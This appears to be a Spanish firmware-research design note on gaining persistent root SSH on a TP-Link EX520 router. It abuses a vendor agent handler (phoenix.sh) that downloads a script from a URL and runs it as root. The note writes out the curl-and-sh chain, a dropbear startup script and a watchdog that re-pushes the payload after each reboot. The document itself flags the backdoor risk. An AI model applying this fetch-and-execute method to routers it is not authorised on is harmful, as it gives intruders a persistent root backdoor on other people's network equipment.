# SSH Permanente en EX520 — Arquitectura y Estrategia

> **Fecha:** 2026-08-25
> **Firmware:** `EX520V124101568249n_agc3000_0945460481`
> **Objetivo:** SSH permanente, bidireccional, que sobreviva reboot

---

## 1. Por qué no funciona SSH via GTPR `so` directo

### 1.1 El problema del dispatch table

El firmware TP-Link usa una tabla de dispatch interna (`rsl_set_dispatch`) para manejar operaciones `so`. Cada objeto de configuración tiene entradas separadas en esta tabla:

```
┌─────────────────────────────────────────────────────────┐
│ Tabla de dispatch de cos (libcmm.so)                     │
├──────────┬──────────────┬───────────────────────────────┤
│ OID      │ SET handler  │ Qué hace                      │
├──────────┼──────────────┼───────────────────────────────┤
│ 0x1765   │ rsl_setDev2  │ SOLO modifica config en       │
│ (TELNET) │ TelnetCfgObj │ memoria. NO inicia telnetd.   │
├──────────┼──────────────┼───────────────────────────────┤
│ 0xbd30   │ oal_setTelnet│ Llama system("telnetd -p %d") │
│ (?)      │ d            │ — pero NUNCA se ejecuta        │
│          │              │   via `so` de Telnet           │
├──────────┼──────────────┼───────────────────────────────┤
│ 0x2d88   │ rsl_setDev2  │ Descarga script del URL y     │
│ (LIFE)   │ LifemoteAgent│ lo ejecuta. SÍ funciona.      │
│          │ Obj          │                               │
└──────────┴──────────────┴───────────────────────────────┘
```

**Resultado:** `so` en `DEV2_TELNET_CFG` solo escribe config. `so` en `DEV2_SSH_CFG` probablemente hace lo mismo. El `so` en `DEV2_LIFEMOTE_AGENT` SÍ ejecuta código (por eso phoenix.sh funciona).

### 1.2 Evidencia estática

| Función | Dirección | Tamaño | Llamada por `so` |
|---------|-----------|--------|-------------------|
| `rsl_setDev2TelnetCfgObj` | 0x10b8d0 | 1616 B | Sí, pero solo modifica config |
| `oal_setTelnetd` | 0x1f9d64 | 180 B | **NO** —入口 separado |
| `rsl_setDev2LifemoteAgentObj` | 0x1baf8c | 344 B | Sí — ejecuta phoenix.sh |
| `rsl_restartDropbear` | — | — | **NO** — nunca invocado por `so` |

### 1.3 Evidencia live

```
Fase 14.5: `so` en DEV2_TELNET_CFG → port 23 CERRADO
Fase 14.6: `so` + ACT_SAVE_CFG → port 23 CERRADO  
Fase 14.7: Análisis forense confirma: set handler ≠ service starter
```

---

## 2. El camino que SÍ funciona: phoenix.sh

### 2.1 Por qué phoenix.sh funciona

```
GTPR `so` DEV2_LIFEMOTE_AGENT
    │
    ▼
rsl_setDev2LifemoteAgentObj (apply handler)
    │
    ▼
phoenix.sh <URL>    ← Ejecuta como root
    │
    ▼
curl <URL> > /tmp/lifemote_cpe_daemon.sh
    │
    ▼
sh /tmp/lifemote_cpe_daemon.sh &   ← Shell root arbitrario
```

**phoenix.sh SÍ ejecuta código porque:**
1. El handler `rsl_setDev2LifemoteAgentObj` tiene lógica para descargar y ejecutar
2. `phoenix.sh` usa `sh` (no `system()` desde cos)
3. El script hereda UID=0 de `cos`

### 2.2 Iniciar dropbear vía phoenix.sh

```bash
# Script que phoenix.sh descarga y ejecuta:
#!/bin/sh
killall dropbear 2>/dev/null
mkdir -p /var/tmp/dropbear
dropbearkey -t rsa -f /var/tmp/dropbear/dropbear_rsa_host_key 2>/dev/null
dropbearmulti dropbear -R -p 22 \
    -r /var/tmp/dropbear/dropbear_rsa_host_key &
```

**Resultado:** dropbear corriendo como root en puerto 22. ✅

---

## 3. Estrategia de Persistencia

### 3.1 El problema

```
Reboot del router
    │
    ▼
rcS → mount UBI → cos → init config
    │
    ▼
NADA inicia dropbear automáticamente
    │
    ▼
SSH no disponible hasta que alguien envíe `so` de nuevo
```

### 3.2 Solución: Watchdog en el host

```
┌─────────────────────────────────────────────────────┐
│ HOST (Linux PC)                                      │
│                                                      │
│  ┌──────────────────┐                                │
│  │ ssh_watchdog.py  │ ← Corre permanentemente        │
│  │                  │                                │
│  │ Monitoriza:      │                                │
│  │  - ping6 al router│                               │
│  │  - GTPR query    │                                │
│  │  - SSH port check│                                │
│  └────────┬─────────┘                                │
│           │                                          │
│    Detecta cold boot                                 │
│    Espera phoenix_grace                              │
│    Envía GTPR set DEV2_LIFEMOTE_AGENT                │
│    Verifica SSH abierto                              │
│           │                                          │
└───────────┼──────────────────────────────────────────┘
            │ GTPR HTTP/80
            ▼
┌─────────────────────────────────────────────────────┐
│ EX520 Router                                         │
│                                                      │
│  phoenix.sh → descarga script → dropbear -p 22 &    │
│                                                      │
│  SSH disponible hasta el próximo reboot               │
└─────────────────────────────────────────────────────┘
```

### 3.3 Flujo completo

```
1. Router hace reboot
2. Watchdog detecta DOWN → UP (cold boot)
3. Watchdog espera 45s (phoenix_grace) para que cos esté listo
4. Watchdog envía: so DEV2_LIFEMOTE_AGENT {enable:1, URL:http://host:8084/start_dropbear.sh}
5. cos ejecuta phoenix.sh → descarga script → dropbear arranca
6. Watchdog verifica puerto 22 abierto
7. Watchdog desactiva phoenix (limpieza)
8. SSH disponible hasta el próximo reboot
9. Repite en cada reboot
```

---

## 4. Herramientas Implementadas

### 4.1 `enable_ssh_permanent.sh` — Habilitación inicial

```bash
# Ejecutar una vez para habilitar SSH
./deploy/ex520_package/enable_ssh_permanent.sh
```

**Qué hace:**
1. Verifica conectividad GTPR
2. Crea script de inicio de dropbear
3. Inicia servidor HTTP local para servir el script
4. Envía GTPR trigger a phoenix.sh
5. Espera a que SSH esté disponible
6. Prueba conexión SSH
7. Instala script de persistencia en misc_rw

### 4.2 `ssh_watchdog.py` — Persistencia

```bash
# Ejecutar en background para mantener SSH después de reboots
nohup python3 deploy/ex520_package/ssh_watchdog.py &
```

**Qué hace:**
1. Monitoriza el router (ping6 + GTPR)
2. Detecta cold boots
3. Re-habilita SSH después de cada reboot
4. Limpia phoenix después de usar

### 4.3 `gtpr_tool.py test-ssh` — Auditoría

```bash
# Probar todos los vectores de acceso
python3 deploy/ex520_package/gtpr_tool.py test-ssh
```

---

## 5. Limitaciones y Riesgos

### 5.1 Limitaciones

| Limitación | Impacto | Mitigación |
|-----------|---------|------------|
| SSH no arranca en boot | Requiere watchdog | ssh_watchdog.py en host |
| phoenix.sh es one-shot | Se desactiva después | Watchdog re-activa |
| dropbear en RAM | Se pierde en reboot | Watchdog re-inicia |
| `INCLUDE_SSH_ACCESS=0` | UI no muestra SSH | No afecta GTPR directo |
| Host key regeneration | Cada inicio genera keys nuevos | Normal para desarrollo |

### 5.2 Riesgos

| Riesgo | Nivel | Nota |
|--------|-------|------|
| Backdoor no intencionado | Medio | Solo accesible en LAN |
| Credenciales débiles | Medio | Usar la misma pass del web admin |
| Expuesto en producción | Bajo | Deshabilitar en producción |
| Watchdog cae | Bajo | SSH sigue corriendo hasta reboot |

### 5.3 Seguridad

```bash
# Para PRODUCCIÓN: deshabilitar SSH después de usar
ssh $EX520_USER@$EX520_IPV6 "killall dropbear"

# O reiniciar el router para limpiar
```

---

## 6. Comparación de Alternativas

| Alternativa | Permanente | Requiere shell | Riesgo | Esfuerzo |
|------------|-----------|---------------|--------|----------|
| phoenix.sh + watchdog | Parcial (re-push post-reboot) | No | Medio | Bajo |
| UART Serial | Sí (físico) | No (hardware) | Bajo | Medio |
| Modificar firmware | Sí | Sí (initial) | Alto | Alto |
| Cron en router | Sí (si crond corre) | Sí (inicial) | Bajo | Bajo |
| procd service | Sí | Sí (inicial) | Bajo | Medio |

---

## 7. Recomendación

**Para desarrollo/investigación:** Usar `enable_ssh_permanent.sh` + `ssh_watchdog.py`
- Funciona inmediatamente
- No modifica firmware
- Reversible

**Para producción:** UART Serial + firmware modification
- Más estable
- No depende de phoenix.sh
- Requiere acceso físico

**Para Detectic MVP:** No necesita SSH
- Usar GTPR/GDPR API (ya probado)
- El sensor corre externamente
- SSH es opcional para debugging
